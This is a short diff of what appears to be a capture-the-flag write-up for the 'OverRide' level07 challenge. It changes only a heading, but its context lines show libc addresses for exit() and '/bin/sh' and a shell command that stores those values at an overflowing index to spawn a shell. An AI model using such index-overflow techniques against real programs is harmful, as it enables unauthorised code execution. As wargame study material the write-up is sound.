@@ -154,7 +154,7 @@ Decimal values can be stored in data storage following by `quit` command to retu
 | exit()    | 0xf7e5eb70  | 4159040368    | 115                        |
 | "/bin/sh" | 0xf7f897ec  | 4160264172    | 116                        |
 
-# Exploit
+## Exploit
 With index 1073741938
 ```shell
 level07@OverRide:~$ (echo -e "store\n4159090384\n1073741938\nstore\n4159040368\n115\nstore\n4160264172\n116\nquit"; cat -) | ./level07
